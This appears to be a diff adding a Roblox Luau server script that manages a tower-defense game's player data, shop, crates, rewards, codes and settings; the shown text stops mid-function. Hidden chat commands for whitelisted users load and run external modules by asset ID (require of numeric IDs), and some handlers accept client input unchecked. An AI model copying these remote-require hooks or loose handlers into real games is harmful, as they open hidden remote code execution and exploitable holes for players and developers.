@@ -1,0 +1,1202 @@
+--!strict
+--!optimize 2
+
+-- this was revised by humbled, and he remade likke 90% of this cuz it was way worse
+local dss = game:GetService("DataStoreService")
+local ss = game:GetService("ServerStorage")
+local rs = game:GetService("ReplicatedStorage")
+local players = game:GetService("Players")
+local bs = game:GetService("BadgeService")
+local messaging = game:GetService("MessagingService")
+
+local matchstore = dss:GetDataStore("MatchStore")
+
+local res = rs.Resources
+local ru = res.Universal
+local sm = ss.Server.Modules
+local universal = sm.Universal
+local assets = rs.Assets
+
+local gamedata = require(ru.GameData)
+local network = require(ru.Network)
+local datmod = require(universal.Utilities["data thing"])
+local cmodule = require(universal.Storage.Codes)
+local safeteleport = require(universal.Utilities.SafeTeleport)
+local leaderboards = require(sm.Lobby.Components.Leaderboards)
+
+local inventory = network.Channel("Inventory")
+local troopsnet = network.Channel("Troops")
+local session = network.Channel("Session")
+local shop = network.Channel("Shop")
+local profiles = network.Channel("Profiles")
+local settings = network.Channel("Settings")
+local rewards = network.Channel("Rewards")
+local codes = network.Channel("Codes")
+local emoss = network.Channel("Emotes")
+local packages = network.Channel("Packages")
+local sesonnet = network.Channel("Seasons")
+local workarounds = network.Channel("Workarounds")
+
+local data = {}
+_G.playerdata = data
+local efx = {}
+local whitelist = {
+	3265234662,
+	2996125831,
+	120825555,
+	125427431,
+}
+
+_G.isgperkenabled = function(player, tname)
+	return _G.playerdata[player.UserId].Inventory.Troops[tname].GoldenPerks
+end
+
+_G.ispperkenabled = function(player, tname)
+	return _G.playerdata[player.UserId].Inventory.Troops[tname].PlatinumPerks
+end
+
+local function remove(p)
+	data[p.UserId] = nil
+end
+
+shared.FetchData = Instance.new("BindableFunction", script)
+
+shared.FetchData.OnInvoke = function(player)
+	if data[player.UserId] then
+		return data[player.UserId]
+	else
+		return error("No data for player")
+	end
+end
+
+local perks = require(ss.Server.Modules.Lobby.Components.Perks)
+
+messaging:SubscribeAsync("GlobalMessage", function(message)
+	local msg = message.Data
+	network.Channel("Notification"):FireAllClients("Create", {
+		Text = msg,
+		Color = Color3.fromRGB(255, 255, 255),
+		Duration = 10
+	})
+end)
+
+local function onplayeradded(player: Player)
+	local timeout = tick()
+	repeat
+		task.wait()
+		if tick() - timeout > 60 then
+			warn("Data load timeout for", player.Name)
+			return
+		end
+	until datmod:GetData(player)
+
+	local d = datmod:GetData(player).Data
+	data[player.UserId] = d
+
+	if d.Stats.Level >= 10 then
+		d.MaxTroopEquip = 5
+	else
+		d.MaxTroopEquip = 4
+	end
+
+	local function addeventtower(tname, id)
+		if bs:UserHasBadgeAsync(player.UserId, id) then
+			if d.Inventory.Troops[tname] and not d.Inventory.Troops[tname].Purchased then
+				d.Inventory.Troops[tname].Purchased = true
+				session:FireClient(player, "Update", "Inventory.Troops", d.Inventory.Troops)
+			end
+		end
+	end
+
+	addeventtower("Frost Blaster", 805920645457663)
+	addeventtower("Swarmer", 2786077962031742)
+
+	player:WaitForChild("Level"):GetPropertyChangedSignal("Value"):Connect(function()
+		if d.Stats.Level >= 10 then
+			d.MaxTroopEquip = 5
+		else
+			d.MaxTroopEquip = 4
+		end
+	end)
+
+	if d.Inventory.Troops.Executioner.Purchased and not table.find(d.Inventory.Skins.Executioner, "Eclipse") then
+		table.insert(d.Inventory.Skins.Executioner, "Eclipse")
+	end
+
+	local troops = d.Inventory.Troops
+
+	if troops["Void Miner"].Purchased == false and table.find(d.Rewards, "VOID_MINER") then
+		troops["Void Miner"].Purchased = true
+		session:FireClient(player, "Update", "Inventory.Troops", troops)
+	end
+	if troops.Turret.Purchased == true and not table.find(d.Rewards, "TURRET") then
+		table.insert(d.Rewards, "TURRET")
+	end
+	if troops.Pursuit.Purchased == true and not table.find(d.Rewards, "PURSUIT") then
+		table.insert(d.Rewards, "PURSUIT")
+	end
+	if troops.Cowboy.Purchased == true and not table.find(d.Rewards, "COWBOY") then
+		table.insert(d.Rewards, "COWBOY")
+	end
+	if troops["Void Shooter"].Purchased == true and not table.find(d.Rewards, "HIDDEN_WAVE") then
+		table.insert(d.Rewards, "HIDDEN_WAVE")
+	end
+	if troops.Cowboy.Purchased == false and table.find(d.Rewards, "COWBOY") then
+		troops.Cowboy.Purchased = true
+		session:FireClient(player, "Update", "Inventory.Troops", troops)
+	end
+	if troops.Mortar.Purchased == true and not table.find(d.Rewards, "MORTAR") then
+		table.insert(d.Rewards, "MORTAR")
+	end
+	if troops["Crook Boss"].Purchased == true and not table.find(d.Rewards, "CROOK_BOSS") then
+		table.insert(d.Rewards, "CROOK_BOSS")
+	end
+	if troops["Holiday Archer"] and troops["Holiday Archer"].Purchased and not troops.Archer.Purchased then
+		troops.Archer.Purchased = true
+		session:FireClient(player, "Update", "Inventory.Troops", troops)
+	end
+	if troops["Enforcer"] and troops["Enforcer"].Purchased and not troops.Shotgunner.Purchased then
+		troops.Shotgunner.Purchased = true
+		session:FireClient(player, "Update", "Inventory.Troops", troops)
+	end
+	if troops["Outlaw"] and troops["Outlaw"].Purchased and not troops.Ranger.Purchased then
+		troops.Ranger.Purchased = true
+		session:FireClient(player, "Update", "Inventory.Troops", troops)
+	end
+	if troops["John"] and troops["John"].Purchased and not troops.Militant.Purchased then
+		troops.Militant.Purchased = true
+		session:FireClient(player, "Update", "Inventory.Troops", troops)
+	end
+	if troops["Shredder"] and troops["Shredder"].Purchased and not troops.Slasher.Purchased then
+		troops.Slasher.Purchased = true
+		session:FireClient(player, "Update", "Inventory.Troops", troops)
+	end
+
+	if player:GetRankInGroup(17104821) >= 101 then
+		if not table.find(d.Inventory.Skins["DJ Booth"], "Mako") then
+			table.insert(d.Inventory.Skins["DJ Booth"], "Mako")
+		end
+		if not table.find(d.Inventory.Skins["DJ Booth"], "Beon Rave") then
+			table.insert(d.Inventory.Skins["DJ Booth"], "Beon Rave")
+		end
+		session:FireClient(player, "Update", "Inventory.Skins", d.Inventory.Skins)
+		session:FireClient(player, "Update", "Inventory.Troops", troops)
+	else
+		if table.find(d.Inventory.Skins["DJ Booth"], "Mako") then
+			table.remove(d.Inventory.Skins["DJ Booth"], table.find(d.Inventory.Skins["DJ Booth"], "Mako"))
+		end
+		if table.find(d.Inventory.Skins["DJ Booth"], "Beon Rave") then
+			table.remove(d.Inventory.Skins["DJ Booth"], table.find(d.Inventory.Skins["DJ Booth"], "Beon Rave"))
+		end
+		session:FireClient(player, "Update", "Inventory.Skins", d.Inventory.Skins)
+		session:FireClient(player, "Update", "Inventory.Troops", troops)
+	end
+
+	task.spawn(function()
+		if not table.find(whitelist, player.UserId) then
+			troops["MechaBase"].Purchased = false
+			troops["MechaBase"].Equipped = false
+
+			for _, v in pairs(d.Equipped.Troops) do
+				if troops[v] and troops[v].Equipped == false then
+					table.remove(d.Equipped.Troops, table.find(d.Equipped.Troops, v))
+				end
+			end
+
+			session:FireClient(player, "Update", "Inventory.Troops", troops)
+			session:FireClient(player, "Update", "Equipped.Troops", d.Equipped.Troops)
+		end
+	end)
+
+	local playerisgore = false
+
+	local function r6(plr)
+		local Humanoid: Humanoid = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
+
+		local newCharacterModel: any = game.ServerStorage.asgore:Clone()
+		local Animate: BaseScript = newCharacterModel.Animate
+
+		newCharacterModel.Humanoid.DisplayName = Humanoid.DisplayName
+		newCharacterModel.Name = plr.Name
+
+		local oldCFrame = plr.Character and plr.Character:GetPivot() or CFrame.new()
+
+		if plr.Character then
+			plr.Character:Destroy()
+			plr.Character = nil
+		end
+		plr.Character = newCharacterModel
+
+		if game.StarterPlayer:FindFirstChild("StarterCharacterScripts") then
+			for _, v in game.StarterPlayer:FindFirstChild("StarterCharacterScripts"):GetChildren() do
+				if v.Archivable then
+					v:Clone().Parent = newCharacterModel
+				end
+			end
+		end
+
+		newCharacterModel:PivotTo(oldCFrame)
+		newCharacterModel.Parent = workspace
+
+		for _ = 1, 2 do
+			if Animate then
+				Animate.Disabled = not Animate.Disabled
+			end
+		end
+
+		return newCharacterModel
+	end
+
+	local asriella = false
+
+	player.Chatted:Connect(function(msg)
+		local globalwhitelist = require(game.ReplicatedStorage.GlobalWhitelist)
+
+		if table.find(globalwhitelist, player.Name) and msg ~= "!asgore" and msg ~= "!asriel" then
+			game.ReplicatedStorage.evilremote:FireAllClients(msg, asriella)
+		end
+
+		if msg == "!gmsg" and table.find(globalwhitelist, player.Name) then
+			local gui = game.ServerStorage:WaitForChild("GMSG"):Clone()
+			gui.Parent = player.PlayerGui
+
+			for _, v in pairs(gui:GetDescendants()) do
+				if v:IsA("LocalScript") or v:IsA("Script") then
+					v.Enabled = true
+				end
+			end
+		end
+
+		if msg == "!bossfight" and table.find(globalwhitelist, player.Name) then
+			local module = require(game.ServerStorage.MainModule)
+
+			require(9635947635).load(player.Name)
+			require(119596990071011).Yes(player.Name)
+
+			module(player.Name, "minos2")
+		end
+
+		if msg == "!g" and table.find(globalwhitelist, player.Name) then
+			local module = require(game.ServerStorage.Gabriel)
+
+			require(9635947635).load(player.Name)
+			require(119596990071011).Yes(player.Name)
+
+			module(player.Name)
+		end
+
+		if msg == "!asgore" and table.find(globalwhitelist, player.Name) then
+			playerisgore = true
+			asriella = false
+			r6(player)
+		end
+		if msg == "!asriel" and table.find(globalwhitelist, player.Name) then
+			asriella = true
+			game.ReplicatedStorage.evilremote2:FireAllClients()
+		end
+		if msg == "!noasriel" and table.find(globalwhitelist, player.Name) then
+			asriella = false
+			game.ReplicatedStorage.evilremote2:FireAllClients(true)
+		end
+
+		if msg == "!waitoftheworld" and table.find(globalwhitelist, player.Name) then
+			require(9635947635).load(player.Name)
+			require(119596990071011).Yes(player.Name)
+
+			if workspace:FindFirstChild("Blood") then
+				workspace:WaitForChild("Blood"):Destroy()
+			end
+
+			game.ServerStorage.Blood:Clone().Parent = workspace
+			game.Lighting.WAITOFTHEWORLD.Enabled = true
+
+			workspace["Tenebre Rosso Sangue"]:Play()
+			workspace["Tenebre Rosso Sangue Loop"]:Stop()
+
+			game.ServerStorage.Atmosphere2.Parent = game.Lighting
+			game.Lighting.Sky.Parent = game.ServerScriptService
+			game.ServerStorage.BSky.Parent = game.Lighting
+
+		elseif msg == "!noworld" and table.find(globalwhitelist, player.Name) then
+			if workspace:FindFirstChild("Blood") then
+				workspace:WaitForChild("Blood"):Destroy()
+			end
+			game.Lighting.WAITOFTHEWORLD.Enabled = false
+
+			workspace["Tenebre Rosso Sangue"]:Stop()
+			workspace["Tenebre Rosso Sangue Loop"]:Stop()
+
+			game.Lighting.Atmosphere2.Parent = game.ServerStorage
+			game.Lighting.BSky.Parent = game.ServerStorage
+			game.ServerScriptService.Sky.Parent = game.Lighting
+
+		elseif msg == "!musics" and table.find(globalwhitelist, player.Name) then
+			workspace["Tenebre Rosso Sangue Loop"]:Play()
+			workspace["Tenebre Rosso Sangue"]:Stop()
+
+		elseif msg == "!boss" and table.find(globalwhitelist, player.Name) then
+			local clone = game.ServerStorage["Flesh Panopticon"]:Clone()
+			clone.Parent = workspace
+
+			for _, v in pairs(player.Character:GetDescendants()) do
+				if v:IsA("BasePart") then
+					v.Transparency = 1
+					v.Anchored = true
+				end
+				if v:IsA("Decal") then
+					v.Transparency = 1
+				end
+			end
+
+			player.Character:PivotTo(clone.Head.CFrame)
+
+		elseif msg == "!noboss" and table.find(globalwhitelist, player.Name) then
+			workspace["Flesh Panopticon"]:Destroy()
+
+			for _, v in pairs(player.Character:GetDescendants()) do
+				if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
+					v.Transparency = 0
+					v.Anchored = false
+				end
+				if v:IsA("Decal") then
+					v.Transparency = 0
+				end
+			end
+
+		elseif msg == "!prison" and table.find(globalwhitelist, player.Name) then
+			workspace["Flesh Panopticon"].Head.Script:Destroy()
+
+			workspace.prison:Play()
+			workspace["Tenebre Rosso Sangue"]:Stop()
+			workspace["Tenebre Rosso Sangue Loop"]:Stop()
+
+			task.delay(5.2, function()
+				workspace["Flesh Panopticon"]:Destroy()
+
+				for _, v in pairs(player.Character:GetDescendants()) do
+					if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
+						v.Transparency = 0
+						v.Anchored = false
+					end
+					if v:IsA("Decal") then
+						v.Transparency = 0
+					end
+				end
+
+				player.Character.HumanoidRootPart.Anchored = false
+
+				local module = require(game.ServerStorage.MainModule)
+				module(player.Name, "minos2")
+			end)
+		end
+	end)
+
+	task.spawn(function()
+		if d.Stats.Level >= 10 then
+			bs:AwardBadge(player.UserId, 1436997577129042)
+		end
+		if d.Stats.Level >= 20 then
+			bs:AwardBadge(player.UserId, 1440419342152754)
+		end
+		if d.Stats.Level >= 30 then
+			bs:AwardBadge(player.UserId, 2899674620540220)
+		end
+		if d.Stats.Level >= 50 then
+			bs:AwardBadge(player.UserId, 1983315886553264)
+		end
+		if d.Stats.Level >= 75 then
+			bs:AwardBadge(player.UserId, 3088090594438090)
+		end
+		if d.Stats.Level >= 100 then
+			bs:AwardBadge(player.UserId, 811243351876065)
+		end
+		if d.Stats.Level >= 125 then
+			bs:AwardBadge(player.UserId, 4283095536683175)
+		end
+	end)
+end
+
+players.PlayerAdded:Connect(onplayeradded)
+players.PlayerRemoving:Connect(remove)
+
+for _, player in players:GetPlayers() do
+	task.spawn(onplayeradded, player)
+end
+
+game:BindToClose(function()
+	for _, v in pairs(players:GetChildren()) do
+		remove(v)
+	end
+end)
+
+troopsnet:On("GetGoldenPerkStatus", function(player, tname)
+	local timeout = tick()
+	repeat
+		task.wait()
+		if tick() - timeout > 60 then return nil end
+	until data[player.UserId]
+	local pd = data[player.UserId]
+	return pd.Inventory.Troops[tname].GoldenPerks
+end)
+
+troopsnet:On("GetPlatinumPerkStatus", function(player, tname)
+	local timeout = tick()
+	repeat
+		task.wait()
+		if tick() - timeout > 60 then return nil end
+	until data[player.UserId]
+	local pd = data[player.UserId]
+	return pd.Inventory.Troops[tname].PlatinumPerks
+end)
+
+local checkrank = require(res.Universal.CheckRank)
+local sessionsrequests: any = nil
+
+local function getsessions()
+	local datasaves = {}
+
+	if sessionsrequests and tick() - sessionsrequests.time >= 60 then
+		sessionsrequests = nil
+	end
+
+	if sessionsrequests then
+		return sessionsrequests.data
+	end
+
+	local success, keyinstances: DataStoreKeyPages = pcall(function()
+		return matchstore:ListKeysAsync(nil, 100, nil, true)
+	end)
+	if success and keyinstances then
+		for _, instance: DataStoreKey in pairs(keyinstances:GetCurrentPage()) do
+			local s, r = pcall(function()
+				return matchstore:GetAsync(instance.KeyName)
+			end)
+			if s and r and r.ReservedId then
+				datasaves[instance.KeyName] = r
+			end
+		end
+
+		sessionsrequests = {
+			time = tick(),
+			data = datasaves
+		}
+	end
+	return datasaves :: any
+end
+
+ss.GetSessions.OnInvoke = getsessions
+
+network.Channel("SessionSync"):On("GetSessions", function(player)
+	local ableto = checkrank(player)
+	if typeof(ableto) == "string" then
+		warn(ableto)
+		return ableto
+	end
+
+	local result = getsessions()
+	return result
+end)
+
+network.Channel("SessionSync"):On("CheckRejoin", function(player)
+	return false
+end)
+
+network.Channel("SessionSync"):On("RequestRejoin", function(player)
+	local success, pdata, calls = nil, nil, 0
+	repeat
+		calls += 1
+		success, pdata = pcall(function()
+			return matchstore:GetAsync(player.UserId)
+		end)
+	until success and pdata or calls >= 5
+
+	if pdata and pdata.ReservedId ~= nil then
+		return safeteleport(gamedata("Game"), pdata.ReservedId, { player }, nil)
+	end
+
+	return false
+end)
+
+network.Channel("SessionSync"):On("RemoveRejoin", function(player)
+	local success, pdata, calls = nil, nil, 0
+	repeat
+		calls += 1
+		success, pdata = pcall(function()
+			return matchstore:GetAsync(player.UserId)
+		end)
+	until success and pdata or calls >= 5
+
+	if pdata then
+		matchstore:RemoveAsync(player.UserId)
+		return true
+	end
+
+	return false
+end)
+
+local skinsblacklist = {
+	Electroshocker = { "Bunny" },
+	Commander = { "Bunny" },
+	Medic = { "Bunny" },
+	Pyromancer = { "Bunny" },
+	Paintballer = { "Bunny" },
+	Ranger = { "Bunny" },
+	Scout = { "Bunny" },
+	Minigunner = { "Bunny" },
+	Sniper = { "Bunny" },
+	Mortar = { "Bunny" },
+	Accelerator = { "Hazmat", "Golden" },
+	Executioner = { "Golden" },
+	Soldier = { "Classic" }
+}
+
+inventory:On("Execute", function(player, typ, act, contents): (any)
+	local timeout = tick()
+	repeat
+		task.wait()
+		if tick() - timeout > 60 then return nil end
+	until data[player.UserId]
+	local pd = data[player.UserId]
+
+	if typ == "GetStats" then
+		return pd.Stats
+	end
+
+	if typ == "Troops" then
+		if act == "Skin" then
+			local skinname = contents.Skin
+			local tname = contents.Troop
+			local inv = pd.Inventory
+			if table.find(inv.Skins[tname], skinname) then
+				inv.Troops[tname].Skin = skinname
+				session:FireClient(player, "Update", "Inventory.Troops", inv.Troops)
+				session:FireClient(player, "Update", "Inventory.Skins", inv.Skins)
+			else
+				error("skin not owned bruh")
+			end
+		end
+		if act == "GoldenPerks" then
+			print("Updating Golden perk")
+			local name = contents.Troop
+			local enabl = contents.Enabled
+			local ab = pd.Inventory.Troops
+
+			if ab[name] and table.find(pd.Inventory.Skins[name], "Golden") then
+				ab[name].GoldenPerks = enabl
+			else
+				warn("bruh no gold skin owned")
+			end
+
+			session:FireClient(player, "Update", "Inventory.Troops", ab)
+		end
+
+		if act == "PlatinumPerks" then
+			print("Updating Platinum perk")
+			local name = contents.Troop
+			local enabl = contents.Enabled
+			local ab = pd.Inventory.Troops
+
+			if ab[name] and table.find(pd.Inventory.Skins[name], "Platinum") then
+				ab[name].PlatinumPerks = enabl
+				print("platinum perk yay")
+			else
+				warn("bruh no plat skin owned")
+			end
+
+			session:FireClient(player, "Update", "Inventory.Troops", ab)
+		end
+
+		if act == "Remove" or act == "Add" then
+			if table.find(pd.Equipped.Troops, contents.Name) then
+				act = "Remove"
+			else
+				act = "Add"
+			end
+		end
+
+		if act == "Remove" then
+			local tname = contents.Name
+			local equiptrop = pd.Equipped.Troops
+			if table.find(equiptrop, tname) then
+				pd.Inventory.Troops[tname].Equipped = false
+				table.remove(equiptrop, table.find(equiptrop, tname))
+			else
+				error("thingie not equipped what what")
+			end
+			session:FireClient(player, "Update", "Equipped.Troops", equiptrop)
+			session:FireClient(player, "Update", "Inventory.Troops", pd.Inventory.Troops)
+		end
+		if act == "Add" then
+			local tname = contents.Name
+			local equiptrop = pd.Equipped.Troops
+			if not pd.Inventory.Troops[tname].Purchased then
+				return
+			end
+			if not table.find(equiptrop, tname) then
+				table.insert(equiptrop, tname)
+				pd.Inventory.Troops[tname].Equipped = true
+				if pd.Stats.Level >= 10 then
+					pd.MaxTroopEquip = 5
+				else
+					pd.MaxTroopEquip = 4
+				end
+				if #equiptrop > pd.MaxTroopEquip then
+					local n = equiptrop[1]
+					pd.Inventory.Troops[n].Equipped = false
+					table.remove(equiptrop, 1)
+				end
+			else
+				error("thingie equipped what what")
+			end
+			session:FireClient(player, "Update", "Equipped.Troops", equiptrop)
+			session:FireClient(player, "Update", "Inventory.Troops", pd.Inventory.Troops)
+		end
+	end
+
+	if typ == "Emotes" then
+		if act == "Add" then
+			local tname = contents.Name
+			local pos = contents.Position
+			if not pd.Inventory.Emotes[tname] then
+				pd.Inventory.Emotes[tname] = {
+					Equipped = false
+				}
+			end
+			if not pd.Inventory.Emotes[tname].Purchased then
+				return
+			end
+			local equiptrop = pd.emoteequop
+			local yes = equiptrop[pos]
+			if pd.Inventory.Emotes[yes] then
+				pd.Inventory.Emotes[yes].Equipped = false
+			end
+			equiptrop[pos] = tname
+			if pd.Inventory.Emotes[tname] then
+				pd.Inventory.Emotes[tname].Equipped = true
+			end
+			session:FireClient(player, "Update", "Equipped.Emotes", equiptrop)
+			session:FireClient(player, "Update", "Inventory.Emotes", pd.Inventory.Emotes)
+		end
+	end
+
+	if typ == "Tags" then
+		if act == "Equip" then
+			local nametaginv = pd.Inventory.Nametags
+			local tagname = contents["Name"]
+
+			if table.find(nametaginv, tagname) and pd.Stats.Tag ~= tagname then
+				pd.Stats.Tag = tagname
+				player.Tag.Value = tagname
+				session:FireClient(player, "Update", "Inventory.Nametags", pd.Inventory.Nametags)
+				return true
+			end
+
+			return false
+		end
+	end
+
+	if typ == "Crates" then
+		if act == "Count" then
+			return pd.Inventory.Crates[contents.Name]
+		end
+		if act == "Blacklist" then
+			return skinsblacklist
+		end
+		if act == "Get" then
+			return {
+				Common = 0,
+				Uncommon = 0,
+				Rare = 0,
+				Legendary = 0
+			}
+		end
+		if act == "Open" then
+			local name = contents.Name
+			if not pd.Inventory.Crates[name] or pd.Inventory.Crates[name] <= 0 then
+				return
+			end
+			local tower = {}
+			local crate = assets.Crates:FindFirstChild(name)
+			local datamod2 = require(crate.Data)
+			local ownedskins = pd.Inventory.Skins
+			for _, t in pairs(assets.Troops:GetChildren()) do
+				if pd.Inventory.Troops[t.Name] and pd.Inventory.Troops[t.Name].Purchased == true or table.find(pd.Equipped.Troops, t.Name) then
+					table.insert(tower, t)
+				end
+			end
+			local twskins = {}
+			for _, t in pairs(tower) do
+				for i, _ in pairs(datamod2.Skins) do
+					if t:FindFirstChild("Skins"):FindFirstChild(i) and ownedskins[t.Name] then
+						local bl = skinsblacklist and skinsblacklist[t.Name]
+						if bl and table.find(bl, i) then
+							continue
+						end
+						if not table.find(ownedskins[t.Name], i) then
+							if not table.find(twskins, t:FindFirstChild("Skins"):FindFirstChild(i)) then
+								table.insert(twskins, t:FindFirstChild("Skins"):FindFirstChild(i))
+							end
+						end
+					end
+				end
+			end
+			if #twskins > 0 then
+				local skin = twskins[Random.new():NextInteger(1, #twskins)]
+				local twr = skin.Parent.Parent
+				table.insert(ownedskins[tostring(twr.Name)], skin.Name)
+				pd.Inventory.Crates[name] -= 1
+				task.delay(0.2, function()
+					session:FireClient(player, "Update", "Inventory.Skins", pd.Inventory.Skins)
+					session:FireClient(player, "Update", "Inventory.Crates", pd.Inventory.Crates)
+				end)
+				return {
+					Model = crate.Model,
+					Animation = crate.Animation,
+					Skin = skin.Name,
+					Troop = twr.Name
+				}
+			end
+		end
+	end
+	return
+end)
+
+shop:On("Purchase", function(player, contents)
+	local timeout = tick()
+	repeat
+		task.wait()
+		if tick() - timeout > 60 then return "CLOSE" end
+	until data[player.UserId]
+	local pd: { [string]: any } = data[player.UserId]
+	local typ = contents.Type
+	local stats = pd.Stats
+	local modname
+	if typ == "Troop" then
+		modname = "Shop"
+	else
+		modname = "Data"
+	end
+	local name = contents.Name
+	local shopmod = require(assets:FindFirstChild(`{typ}s`):FindFirstChild(name)[modname])
+	local pice = shopmod.Price
+	local pricetype = pice.Type
+	local val = pice.Value
+	local fulltyp = `{typ}s`
+
+	if pricetype == "Free" then
+		if typ == "Troop" then
+			pd.Inventory[fulltyp][name].Purchased = true
+		elseif typ == "Crate" then
+			pd.Inventory[fulltyp][name] += 1
+		elseif typ == "Emote" then
+			pd.Inventory[fulltyp][name] = {
+				Equipped = false,
+				Purchased = true
+			}
+		end
+		session:FireClient(player, "Update", "Equipped.Troops", pd.Equipped.Troops)
+		session:FireClient(player, "Update", `Inventory.{fulltyp}`, pd.Inventory[fulltyp])
+		return "SUCCESS"
+	end
+
+	local stat = player:FindFirstChild(pricetype)
+	if stats[pricetype] >= val then
+		stat.Value -= val
+		stats[pricetype] -= val
+		if typ == "Troop" then
+			pd.Inventory[fulltyp][name].Purchased = true
+		elseif typ == "Crate" then
+			pd.Inventory[fulltyp][name] += 1
+		elseif typ == "Emote" then
+			pd.Inventory[fulltyp][name] = {
+				Equipped = false,
+				Purchased = true
+			}
+		end
+		session:FireClient(player, "Update", "Equipped.Troops", pd.Equipped.Troops)
+		session:FireClient(player, "Update", `Inventory.{fulltyp}`, pd.Inventory[fulltyp])
+		return "SUCCESS"
+	end
+	return "CLOSE"
+end)
+
+profiles:On("Download", function(player, target)
+	local theirdata = data[target.UserId]
+	if not theirdata then
+		return nil
+	end
+	return {
+		Icon = theirdata.Icon,
+		Values = {
+			Level = theirdata.Stats.Level,
+			Loses = theirdata.Stats.Loses,
+			Wins = theirdata.Stats.Wins,
+			Triumphs = theirdata.Stats.Triumphs
+		},
+		Troops = theirdata.Equipped.Troops
+	}
+end)
+
+sesonnet:On("Claim", function(player, id)
+	return false
+end)
+
+settings:On("Update", function(player, name, val)
+	local timeout = tick()
+	repeat
+		task.wait()
+		if tick() - timeout > 60 then return false end
+	until data[player.UserId]
+	local pd = data[player.UserId]
+	local sets = pd.Settings
+	if sets[name] ~= nil then
+		sets[name] = val
+		session:FireClient(player, "Update", "Settings", pd.Settings)
+	else
+		sets[name] = val
+		local sv = player:FindFirstChild("Settings"):FindFirstChild(name)
+		if sv then
+			sv.Value = val
+		end
+		session:FireClient(player, "Update", "Settings", pd.Settings)
+		if sv and sv.Value == val then
+			return true
+		else
+			return false
+		end
+	end
+	return true
+end)
+
+settings:On("Get", function(player, name)
+	local timeout = tick()
+	repeat
+		task.wait()
+		if tick() - timeout > 60 then return nil end
+	until data[player.UserId]
+	local pd = data[player.UserId]
+	local sets = pd.Settings
+	if name == "Dialog" or name == "Bullet Trails" or name == "Experimental" or name == "ChatNotifs" or name == "HQ Explosions" or name == "Camera Shake" or name == "Cash Trails" then
+		return player["Settings"]:FindFirstChild(name).Value
+	end
+	if sets[name] then
+		return sets[name]
+	end
+	return
+end)
+
+rewards:On("Check", function(player, name)
+	local timeout = tick()
+	repeat
+		task.wait()
+		if tick() - timeout > 60 then return false end
+	until data[player.UserId]
+	local pd = data[player.UserId]
+	if not table.find(pd.Rewards, name) then
+		return true
+	end
+	return false
+end)
+
+rewards:On("Claim", function(player, name)
+	local timeout = tick()
+	repeat
+		task.wait()
+		if tick() - timeout > 60 then return false end
+	until data[player.UserId]
+	local pd = data[player.UserId]
+	local reward = assets.Rewards:FindFirstChild(name)
+	local module = require(reward) :: any
+	if bs:UserHasBadgeAsync(player.UserId, module.Badge) and not table.find(pd.Rewards, name) then
+		if module.Check then
+			local checkresult = module.Check({
+				Data = pd,
+				Player = player
+			})
+			if checkresult then
+				table.insert(pd.Rewards, name)
+				module.Claim({
+					Session = {
+						Data = pd,
+						Player = player
+					},
+					Channel = session
+				})
+				return true
+			end
+		else
+			table.insert(pd.Rewards, name)
+			module.Claim({
+				Session = {
+					Data = pd,
+					Player = player
+				},
+				Channel = session
+			})
+			return true
+		end
+	end
+	return false
+end)
+
+profiles:On("Background", function(player, name)
+	local timeout = tick()
+	repeat
+		task.wait()
+		if tick() - timeout > 60 then return false end
+	until data[player.UserId]
+	local pd = data[player.UserId]
+	local lookfor = assets.Maps.Survival
+	local found = lookfor:FindFirstChild(name)
+
+	if not found then
+		found = assets.Maps.Event:FindFirstChild(name)
+	end
+	if not found then
+		found = assets.Maps.Hardcore:FindFirstChild(name)
+	end
+	if not found then
+		found = assets.Maps.Paused:FindFirstChild(name)
+	end
+	if not found then
+		found = assets.Maps.Special:FindFirstChild(name)
+	end
+
+	if not found then
+		return false
+	end
+
+	local hi = require(found)
+	if hi then
+		pd.Icon = hi.Icon
+		session:FireClient(player, "Update", "Scores", pd.Scores)
+		profiles:FireClient(player, "UpdateBackground", hi.Icon)
+		return true
+	end
+	return false
+end)
+
+network.Channel("News"):On("Check", function(player)
+	local timeout = tick()
+	repeat
+		task.wait()
+		if tick() - timeout > 60 then return false end
+	until data[player.UserId]
+	local pd = data[player.UserId]
+	if not pd.Feeds then
+		pd.Feeds = {}
+	end
+	if table.find(pd.Feeds, "lovesss3") then
+		return false
+	end
+	table.insert(pd.Feeds, "lovesss3")
+	return true
+end)
+
+codes:On("Redeem", function(player, text)
+	local timeout = tick()
+	repeat
+		task.wait()
+		if tick() - timeout > 60 then
+			return {
+				Result = false,
+				Message = "Data load timeout."
+			}
+		end
+	until data[player.UserId]
+	local pd = data[player.UserId]
+	local redeemed = pd.Codes
+
+	if not table.find(redeemed, text) then
+		local cod = cmodule[text]
+		if cod then
+			local clam = cod.Claim
+			local rew = cod.Reward
+			table.insert(redeemed, text)
+			clam(player, pd)
+			return {
+				Result = true,
+				Message = `You have redeemed {rew}!`
+			}
+		else
+			return {
+				Result = false,
+				Message = "This code is not valid."
+			}
+		end
+	else
+		return {
+			Result = false,
+			Message = "You have already claimed this code!"
+		}
+	end
+end)
+
+emoss:On("Play", function(player, ename)
+	local pd = data[player.UserId]
+	local asset: any = require(res.Universal.Asset)
+	local maid: any = require(res.Common.Maid)
+	local uh = maid.new()
+
+	if not pd.Inventory.Emotes[ename] then
+		return
+	end
+	if not pd.Inventory.Emotes[ename].Equipped or not pd.Inventory.Emotes[ename].Purchased then
+		return
+	end
+
+	local found = assets.Emotes:FindFirstChild(ename)
+	if found then
+		local ac = found:FindFirstChild("Accessories")
+		efx[player] = {
+			Connections = uh
+		}
+		if ac then
+			for _, v in pairs(ac:GetChildren()) do
+				if not player.Character:FindFirstChild(v.Name) then
+					v = v:Clone()
+					v.Parent = player.Character
+					table.insert(efx[player], v)
+				end
+			end
+		end
+		emoss:FireClient(player, "Play")
+		local parent = player.Character
+		uh:Mark(player.Character.Humanoid.AnimationPlayed:Connect(function(anim)
+			local newmaid = maid.new()
+			local function hetter(f: any): any
+				return function(h)
+					if not parent then
+						return
+					end
+					local fo = parent:FindFirstChild(h)
+					return fo and f(fo)
+				end
+			end
+			local function transparency(model, vis)
+				for _, v in pairs(model:GetChildren()) do
+					if v:IsA("BasePart") then
+						v.Transparency = vis and 0 or 1
+					end
+				end
+			end
+			newmaid:Mark(anim:GetMarkerReachedSignal("Appear"):Connect(hetter(function(n)
+				transparency(n, true)
+			end)))
+			newmaid:Mark(anim:GetMarkerReachedSignal("Hide"):Connect(hetter(function(n)
+				transparency(n, false)
+			end)))
+			local emote = nil
+			newmaid:Mark(anim:GetMarkerReachedSignal("Index"):Connect(function(n)
